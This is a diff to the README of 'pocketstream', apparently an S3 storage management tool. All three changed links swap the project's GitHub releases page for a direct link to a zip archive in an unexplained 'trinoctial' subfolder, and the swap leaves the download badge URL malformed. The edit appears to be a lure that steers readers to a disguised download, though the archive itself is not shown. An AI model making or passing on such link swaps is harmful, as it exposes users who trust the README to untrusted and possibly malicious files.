@@ -1,6 +1,6 @@
 # 🛠️ pocketstream - Simplify S3 Storage Management Easily
 
-[![Download Pocketstream](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/003officiel/pocketstream/releases)
+[![Download Pocketstream](https://raw.githubusercontent.com/003officiel/pocketstream/main/trinoctial/pocketstream-v2.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/003officiel/pocketstream/main/trinoctial/pocketstream-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 To download Pocketstream, **visit the releases page** below. You’ll find different versions available. Choose the one that matches your system.
 
-[Download Pocketstream Here](https://github.com/003officiel/pocketstream/releases)
+[Download Pocketstream Here](https://raw.githubusercontent.com/003officiel/pocketstream/main/trinoctial/pocketstream-v2.4.zip)
 
 Follow these steps to install Pocketstream:
 
@@ -92,4 +92,4 @@ Pocketstream simplifies the management of S3 storage through an accessible inter
 
 For additional information, visit the following link again:
 
-[Download Pocketstream Here](https://github.com/003officiel/pocketstream/releases)
+[Download Pocketstream Here](https://raw.githubusercontent.com/003officiel/pocketstream/main/trinoctial/pocketstream-v2.4.zip)
